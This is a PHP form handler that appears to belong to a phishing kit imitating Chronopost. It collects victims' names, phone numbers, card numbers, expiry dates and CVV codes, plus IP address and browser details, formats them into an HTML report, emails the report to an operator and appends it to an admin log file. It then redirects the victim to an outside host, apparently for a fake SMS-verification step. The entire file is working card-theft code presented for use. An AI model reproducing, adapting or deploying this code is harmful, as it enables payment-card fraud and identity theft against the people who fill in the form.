<?php

session_start();

include('../__CONFIG__.php');

if (isset($_POST['submit']))
{

$date= date('l jS \of F Y h:i:s A');
$subject = "$ip";
$headers = "From: -Jat CC azbi <rzultahmsfr365@mailler.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$message=
"	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
		
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>chronopost [ CARD ]</h3>
		<td style='width: 400px;'><a target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
		<h3 style='text-align: center;background: #ff0000;margin: 0px;padding: 3px;font-size: 12px;'>chronopost [".$date."]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Nom et Prenom</b></td>
				<td style='width: 400px;'>".$_POST['name']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>N° de Tel</b></td>
				<td style='width: 400px;'>".$_POST['tel']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Numéro de carte</b></td>
				<td style='width: 400px;'>".$_POST['carte']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date d'expiration</b></td>
				<td style='width: 400px;'>".$_POST['date']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Cryptogramme Exp</b></td>
				<td style='width: 400px;'>".$_POST['cvv']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>By DCH</b></td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
";
	$Txt_Rezlt = fopen('../admin/rezulta.php', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);

	header('Location: https://cigam.ru/config/Chrono/sms/Chrono/load2.php');
}
